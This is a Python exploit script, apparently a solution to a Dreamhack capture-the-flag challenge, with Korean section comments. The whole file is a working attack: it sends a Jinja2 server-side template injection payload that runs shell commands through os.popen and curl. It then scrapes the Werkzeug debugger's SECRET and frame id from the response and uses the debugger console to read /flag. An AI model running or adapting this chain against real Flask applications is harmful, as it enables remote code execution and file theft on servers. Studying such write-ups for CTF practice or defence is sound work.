import requests
import urllib.parse
import html
import re
from bs4 import BeautifulSoup

#--------------------------------------------------------------------
# 1. 최초 설정
#--------------------------------------------------------------------
URL = "http://host3.dreamhack.games:22421/"
TARGET_URL = "http://localhost:8000/"
INFO_GATHER_URI = "keygen/a"
ATTACK_VECTOR = TARGET_URL + INFO_GATHER_URI
ORIGINAL_PAYLOAD = "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl "+ATTACK_VECTOR+"').read()}}"
ENCODED_PAYLOAD = urllib.parse.quote(ORIGINAL_PAYLOAD)
SECRET = ""
FRM = ""
PIN = ""

#--------------------------------------------------------------------
# 2. 정보수집
# 1) SECRET_KEY 추출
#--------------------------------------------------------------------
print('[*] INFORMATION GATHERING')
resp = requests.get(URL+ENCODED_PAYLOAD)
RESP_UNESCAPE = html.unescape(resp.text)

SECRET_PATTERN = 'SECRET = "[a-zA-Z0-9]+";'

HTML_PARSE_DATA = BeautifulSoup(RESP_UNESCAPE, "html.parser")
FRM_LIST = HTML_PARSE_DATA.select_one('li')
FRM = FRM_LIST.select_one('div')['id'][6:]

print('[+] PAYLOAD\'s FRM DATA : ', FRM)

SECRET_DATA = str(HTML_PARSE_DATA.find("script", text=re.compile("SECRET")).contents[0])
SECRET_DATA = re.sub('var ', '{"', SECRET_DATA)
SECRET_DATA = re.sub(';', '"}', SECRET_DATA)
SECRET_DATA = re.sub(',', '","', SECRET_DATA)
SECRET_DATA = re.sub('=', '":"', SECRET_DATA)
SECRET_DATA = re.sub('[\n]|[ ]|', '', SECRET_DATA)
SECRET_DATA = re.sub('""', '"', SECRET_DATA)

exec('DICT_DATA='+SECRET_DATA)
SECRET=DICT_DATA['SECRET']

print('[+] GET CURRENT SECRET DATA COMPLETE')
print('[+] SECRET DATA : ', SECRET)



#--------------------------------------------------------------------
# 3. 최종 공격 전 세션 획득
#--------------------------------------------------------------------
ATTACK_URI = 'keygen/a?&__debugger__=yes&cmd=print(open("/flag", "r").read())&frm='+FRM+'&s='+SECRET
ATTACK_VECTOR = TARGET_URL + ATTACK_URI
ORIGINAL_PAYLOAD = "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl -v "+ATTACK_VECTOR+"').read()}}"
ENCODED_PAYLOAD = urllib.parse.quote(ORIGINAL_PAYLOAD)
print('[+] ATTACK_PAYLOAD : ', ATTACK_URI)
print('[*] NOW ATTACK URL : ', URL + ENCODED_PAYLOAD)

resp = requests.get(URL + ENCODED_PAYLOAD)
print(resp.text)

#--------------------------------------------------------------------
# 4. 플래그 획득
#--------------------------------------------------------------------